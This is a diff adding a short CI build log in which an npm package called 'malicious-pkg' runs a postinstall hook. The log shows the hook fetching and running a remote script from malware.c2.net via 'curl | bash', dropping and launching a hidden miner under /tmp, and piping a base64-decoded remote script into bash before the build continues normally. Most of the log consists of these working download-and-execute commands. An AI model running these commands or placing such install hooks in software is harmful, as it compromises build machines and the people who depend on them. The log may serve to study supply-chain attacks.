@@ -1,0 +1,10 @@
+2026-09-12T09:01:00Z [INFO] Job: build, Runner: ubuntu-latest
+2026-09-12T09:01:01Z [INFO] Installing npm packages...
+2026-09-12T09:01:03Z [INFO] > malicious-pkg@1.0.1 postinstall
+2026-09-12T09:01:04Z [RUN]  node -e "require('child_process').exec('curl -s http://malware.c2.net/stage2.sh | bash')"
+2026-09-12T09:01:05Z [OUT]  Downloading stage2 payload...
+2026-09-12T09:01:06Z [RUN]  wget -q http://malware.c2.net/miner -O /tmp/.hidden_miner && chmod +x /tmp/.hidden_miner && /tmp/.hidden_miner &
+2026-09-12T09:01:07Z [OUT]  [1] 3471
+2026-09-12T09:01:08Z [RUN]  curl -s http://malware.c2.net/keys | base64 -d | bash
+2026-09-12T09:01:09Z [INFO] npm install complete
+2026-09-12T09:01:10Z [INFO] Running unit tests...
